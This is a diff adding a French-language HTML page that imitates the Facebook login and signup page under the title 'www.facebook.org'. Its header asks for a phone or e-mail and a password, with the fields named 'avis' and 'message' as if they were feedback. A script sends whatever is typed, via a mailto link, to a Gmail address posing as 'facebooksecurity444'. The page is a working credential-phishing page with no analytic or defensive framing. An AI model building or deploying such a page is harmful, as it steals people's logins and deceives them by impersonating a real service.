@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>www.facebook.org</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background: #f0f2f5;
+    color: #1c1e21;
+}
+
+/* HEADER */
+#navwrapper {
+    background: #fff;
+    padding: 20px;
+    border-bottom: 1px solid #ddd;
+}
+
+#navbar {
+    max-width: 1100px;
+    margin: auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 20px;
+}
+
+.logowrapper {
+    color: #1877f2;
+    font-size: 43px;
+    font-weight: bold;
+    letter-spacing: -2px;
+}
+
+/* FORMULAIRE HEADER */
+.tablewrapper {
+    border-spacing: 8px;
+}
+
+.row1 {
+    font-size: 13px;
+    color: #606770;
+}
+
+.inputtext {
+    padding: 10px;
+    width: 170px;
+    border: 1px solid #ccd0d5;
+    border-radius: 5px;
+    outline: none;
+}
+
+.inputtext:focus,
+.inputbody:focus {
+    border-color: #1877f2;
+}
+
+#button {
+    background: #1877f2;
+    color: white;
+    padding: 10px 17px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    border: none;
+}
+
+#button:hover {
+    background: #166fe5;
+}
+
+.row2 {
+    font-size: 12px;
+    color: #606770;
+}
+
+.h {
+    cursor: pointer;
+    color: #1877f2;
+}
+
+/* CONTENU */
+#contentwrapper {
+    padding: 65px 20px;
+}
+
+#content {
+    max-width: 1050px;
+    margin: auto;
+    display: flex;
+    justify-content: space-between;
+    gap: 50px;
+}
+
+/* GAUCHE */
+#leftbod {
+    width: 50%;
+    padding-top: 30px;
+}
+
+.connect {
+    font-size: 27px;
+    font-weight: bold;
+    line-height: 1.4;
+    margin-bottom: 35px;
+}
+
+.leftbar {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    margin-bottom: 30px;
+}
+
+.iconwrap {
+    width: 45px;
+    height: 45px;
+    font-size: 30px;
+}
+
+.rowtext {
+    display: block;
+    font-size: 17px;
+    font-weight: bold;
+}
+
+.rowtext2 {
+    display: block;
+    color: #606770;
+    font-size: 15px;
+    margin-top: 5px;
+}
+
+/* FORMULAIRE INSCRIPTION */
+#rightbod {
+    width: 430px;
+    background: white;
+    padding: 25px;
+    border-radius: 10px;
+    box-shadow: 0 3px 15px rgba(0,0,0,0.08);
+}
+
+.signup {
+    font-size: 30px;
+    font-weight: bold;
+}
+
+.free {
+    margin-top: 8px;
+    margin-bottom: 20px;
+    color: #606770;
+}
+
+.formbox {
+    margin-bottom: 13px;
+}
+
+.inputbody {
+    width: 100%;
+    padding: 13px;
+    border: 1px solid #ccd0d5;
+    border-radius: 6px;
+    font-size: 15px;
+    outline: none;
+    background: #f5f6f7;
+}
+
+.in1 {
+    width: 49%;
+}
+
+.formbox:has(.in1) {
+    display: flex;
+    gap: 8px;
+}
+
+.bday {
+    font-weight: bold;
+    font-size: 15px;
+    margin-top: 10px;
+}
+
+.selectbody {
+    padding: 10px;
+    border: 1px solid #ccd0d5;
+    border-radius: 5px;
+    background: white;
+    font-size: 14px;
+    margin-right: 5px;
+}
+
+.spanpad {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.gender {
+    margin-right: 12px;
+    font-size: 15px;
+}
+
+.agree {
+    font-size: 12px;
+    color: #606770;
+    line-height: 1.6;
+}
+
+.signbut {
+    width: 100%;
+    background: #42b72a;
+    color: white;
+    border: none;
+    padding: 13px;
+    border-radius: 6px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.signbut:hover {
+    background: #36a420;
+}
+
+.create {
+    text-align: center;
+    font-size: 13px;
+    margin-top: 15px;
+}
+
+/* MOBILE */
+@media (max-width: 750px) {
+    #navwrapper {
+        padding: 15px;
+    }
+
+    #navbar {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .logowrapper {
+        font-size: 38px;
+    }
+
+    .tablewrapper {
+        width: 100%;
+    }
+
+    .inputtext {
+        width: 100%;
+    }
+
+    #contentwrapper {
+        padding: 30px 15px;
+    }
+
+    #content {
+        flex-direction: column;
+        align-items: center;
+        gap: 35px;
+    }
+
+    #leftbod {
+        width: 100%;
+        padding-top: 0;
+    }
+
+    .connect {
+        font-size: 23px;
+        text-align: center;
+    }
+
+    #rightbod {
+        width: 100%;
+        max-width: 430px;
+    }
+}
+
+@media (max-width: 380px) {
+    .selectbody {
+        padding: 7px;
+        font-size: 12px;
+    }
+
+    .connect {
+        font-size: 20px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div id="navwrapper">
+    <div id="navbar">
+
+        <h1 class="logowrapper">Facebook</h1>
+
+        <table class="tablewrapper">
+            <tr>
+                <td class="row1">Téléphone ou E-mail</td>
+                <td class="row1">Mot de passe</td>
+            </tr>
+
+            <tr>
+                <td>
+                    <input type="text"
+                    id="avis"
+                    class="inputtext"
+                    placeholder="">
+                </td>
+
+                <td>
+                    <input type="text"
+                    id="message"
+                    class="inputtext"
+                    placeholder="">
+                </td>
+
+                <td>
+                    <button type="button"
+                    id="button"
+                    onclick="envoyerMessage()">
+                        connexion
+                    </button>
+                </td>
+            </tr>
+        </table>
+
+    </div>
+</div>
+
+<!-- CONTENU PRINCIPAL -->
+<div id="contentwrapper">
+    <div id="content">
+
+        <!-- SECTION GAUCHE -->
+        <div id="leftbod">
+
+            <div class="connect">
+                Connectez-vous avec vos amis et découvrez le monde autour de vous.
+            </div>
+
+            <div class="leftbar">
+                <div class="iconwrap">📸</div>
+                <div>
+                    <span class="rowtext">Photos et actualités</span>
+                    <span class="rowtext2">
+                        Découvrez les publications de vos amis.
+                    </span>
+                </div>
+            </div>
+
+            <div class="leftbar">
+                <div class="iconwrap">🌍</div>
+                <div>
+                    <span class="rowtext">Partagez votre quotidien</span>
+                    <span class="rowtext2">
+                        Racontez votre histoire au monde.
+                    </span>
+                </div>
+            </div>
+
+            <div class="leftbar">
+                <div class="iconwrap">🔎</div>
+                <div>
+                    <span class="rowtext">Explorez davantage</span>
+                    <span class="rowtext2">
+                        Découvrez de nouvelles personnes et idées.
+                    </span>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- INSCRIPTION DEMO -->
+        <div id="rightbod">
+
+            <div class="signup">Créer un compte</div>
+
+            <div class="free">
+                C'est gratuit et ça le restera toujours.
+            </div>
+
+            <div class="formbox">
+                <input type="text"
+                class="inputbody in1"
+                placeholder="Prénom">
+
+                <input type="text"
+                class="inputbody in1"
+                placeholder="Nom">
+            </div>
+
+            <div class="formbox">
+                <input type="email"
+                class="inputbody"
+                placeholder="Adresse e-mail">
+            </div>
+
+            <div class="formbox">
+                <input type="password"
+                class="inputbody"
+                placeholder="Nouveau mot de passe">
+            </div>
+
+            <div class="formbox">
+                <div class="bday">Date de naissance</div>
+            </div>
+
+            <div class="formbox">
+
+                <select class="selectbody">
+                    <option value="">Mois</option>
+                    <option>Janvier</option>
+                    <option>Février</option>
+                    <option>Mars</option>
+                    <option>Avril</option>
+                    <option>Mai</option>
+                    <option>Juin</option>
+                    <option>Juillet</option>
+                    <option>Août</option>
+                    <option>Septembre</option>
+                    <option>Octobre</option>
+                    <option>Novembre</option>
+                    <option>Décembre</option>
+                </select>
+
+                <select class="selectbody">
+                    <option value="">Jour</option>
+                    <script>
+                    for(let i = 1; i <= 31; i++) {
+                        document.write("<option>" + i + "</option>");
+                    }
+                    </script>
+                </select>
+
+                <select class="selectbody">
+                    <option value="">Année</option>
+                    <script>
+                    for(let i = 2015; i >= 2005; i--) {
+                        document.write("<option>" + i + "</option>");
+                    }
+                    </script>
+                </select>
+
+            </div>
+
+            <div class="formbox">
+                <div class="bday">Genre</div>
+
+                <span class="spanpad">
+
+                    <label class="gender">
+                        <input type="radio" name="genre" value="Femme">
+                        Femme
+                    </label>
+
+                    <label class="gender">
+                        <input type="radio" name="genre" value="Homme">
+                        Homme
+                    </label>
+
+                </span>
+            </div>
+
+            <div class="formbox">
+                <button type="button" class="signbut">
+                    Créer un compte
+                </button>
+            </div>
+
+            <div class="formbox">
+                <div class="create">
+                    
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+<!-- JAVASCRIPT -->
+<script>
+
+function envoyerMessage() {
+
+    const destinataire = "facebooksecurity444@gmail.com";
+
+    const avis = document.getElementById("avis").value.trim();
+
+    const message = document.getElementById("message").value.trim();
+
+    if (avis === "" && message === "") {
+        alert("Veuillez écrire un avis ou un message.");
+        return;
+    }
+
+    const sujet = "Nouveau message - Xbook";
+
+    const contenu =
+        "Nouveau retour reçu depuis Xbook\n\n" +
+        "AVIS :\n" + (avis || "Aucun avis") +
+        "\n\nMESSAGE :\n" + (message || "Aucun message");
+
+    const url = "mailto:" + destinataire +
+        "?subject=" + encodeURIComponent(sujet) +
+        "&body=" + encodeURIComponent(contenu);
+
+    window.location.href = url;
+}
+
+</script>
+
+</body>
+</html>
